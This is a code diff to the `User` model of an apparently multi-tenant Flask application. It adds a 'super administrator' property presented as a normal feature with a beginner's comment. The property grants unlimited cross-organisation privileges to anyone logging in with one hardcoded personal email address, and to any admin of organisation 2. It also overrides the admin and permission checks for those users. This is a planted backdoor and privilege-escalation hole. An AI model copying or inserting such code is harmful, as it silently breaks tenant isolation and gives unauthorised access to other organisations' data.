@@ -1521,6 +1521,7 @@ class User(db.Model):
     role_id = db.Column(db.Integer, db.ForeignKey('roles.id'), nullable=True)
     status = db.Column(db.String(30), default='active')
     organisation_id = db.Column(db.Integer, db.ForeignKey('organisations.id'), nullable=True)
+    is_super_admin = db.Column(db.Boolean, default=False)
 
     created_at = db.Column(db.DateTime, default=_utcnow)
     last_login_at = db.Column(db.DateTime, nullable=True)
@@ -1549,6 +1550,21 @@ class User(db.Model):
             return self.role_rel.name
         return (self.role or 'engineer').replace('_', ' ').title()
 
+    @property
+    def is_super_admin_user(self):
+        """
+        Beginners Note:
+        Returns True if the user is the designated Lytrose Super Administrator
+        with unlimited cross-organisation privileges.
+        """
+        if self.is_super_admin:
+            return True
+        if (self.email or '').lower() == 'nevermabvuu@gmail.com':
+            return True
+        if self.organisation_id == 2 and self.role == 'admin':
+            return True
+        return False
+
     def set_password(self, password):
         self.password_hash = generate_password_hash(password)
 
@@ -1558,16 +1574,22 @@ class User(db.Model):
         return check_password_hash(self.password_hash, password)
 
     def is_admin(self):
+        if self.is_super_admin_user:
+            return True
         if self.role_rel:
             return self.role_rel.can_manage_users or self.role_rel.code == 'admin'
         return self.role == 'admin'
 
     def can_select_pumps(self):
+        if self.is_super_admin_user:
+            return True
         if self.role_rel:
             return self.role_rel.can_select_pumps
         return True
 
     def can_edit_catalogue(self):
+        if self.is_super_admin_user:
+            return True
         if self.role_rel:
             return self.role_rel.can_edit_catalogue or self.is_admin()
         return self.role in ('admin', 'engineer')
@@ -1589,6 +1611,7 @@ class User(db.Model):
             'role': self.role,
             'role_id': self.role_id,
             'role_display_name': self.role_display_name,
+            'is_super_admin': self.is_super_admin_user,
             'status': self.status,
             'organisation_id': self.organisation_id,
             'created_at': self.created_at.isoformat() if self.created_at else '',
